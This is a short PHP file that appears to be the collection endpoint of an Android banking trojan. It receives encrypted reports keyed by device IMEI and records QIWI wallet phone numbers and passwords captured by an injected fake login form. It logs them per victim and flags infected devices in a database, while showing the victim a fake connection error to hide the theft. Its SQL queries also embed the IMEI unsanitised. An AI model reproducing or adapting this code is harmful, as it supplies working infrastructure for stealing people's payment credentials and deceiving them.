<?php  
include 'crypt.php';
include 'config.php';

	$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
	$request =  decrypt($request,cryptKey);

	$massivReq = explode("|", $request);
	$IMEI_log = $massivReq[0]; 
	$text_log = $massivReq[1]; 
	
	//КИВИ
	if($text_log == "QIWI")
	{
		
	$user = $_POST['mob_num'];
	$pass = $_POST['pass'];
	
	$l_u = "";
	$l_p = "";
	
	if($user!="") $l_u = "Номер: $user";
	if($pass!="") $l_p = "Пароль: $pass";
	
	$text_log = "Инжект(QIWI)\n$l_u\n$l_p\n";
	}
	
echo "HTTP: Error 12007 when connecting";

if(($IMEI_log != "") && ($text_log != ""))
{
	//Записываем ЛОГи!    
	$path_log = "logs/$IMEI_log.log";	
	$perehod = "\n";
	$str_log = "$IMEI_log: $text_log$perehod";
	file_put_contents($path_log, $str_log, FILE_APPEND);



	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$data_ = date('Y-m-d H:i');
	$sql3 = "UPDATE kliets SET lastConnect = '$data_' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
	
	$sql3 = "UPDATE kliets SET log = '1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
		
	$sql3 = "UPDATE kliets SET  inj = '1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);

}
?>